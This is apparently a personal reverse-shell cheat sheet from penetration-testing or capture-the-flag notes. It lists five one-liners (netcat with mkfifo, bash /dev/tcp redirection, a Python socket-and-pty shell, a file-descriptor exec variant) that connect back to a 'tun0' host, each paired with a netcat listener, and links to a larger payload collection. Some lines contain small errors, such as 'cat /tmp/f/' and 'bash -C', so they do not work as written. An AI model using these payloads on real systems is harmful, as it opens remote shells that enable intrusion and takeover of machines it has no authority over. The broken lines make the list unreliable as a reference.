**The following will be a few lines of what I've used in the past to get a better shell.**

1. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f/|/bin/sh -i 2>&1|nc tun0 1234 >/tmp/f
2. nc -nvlp 1234

3. /bin/bash -C 'bash -i >& /dev/tcp/tun0/1234 0>&1'
4. nc -nvlp 1234

5. python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("tun0",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
6. nc -nvlp 1234

7. bash -i >& /dev/tcp/tun0/1234 0>&1
8. nc -nvlp 1234

9. 0<&196;exec 196<>/dev/tcp/tun0/1234; sh <&196 >&196 2>&196
10. nc -nvlp 1234

Longer list of great payloads to use **https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md**



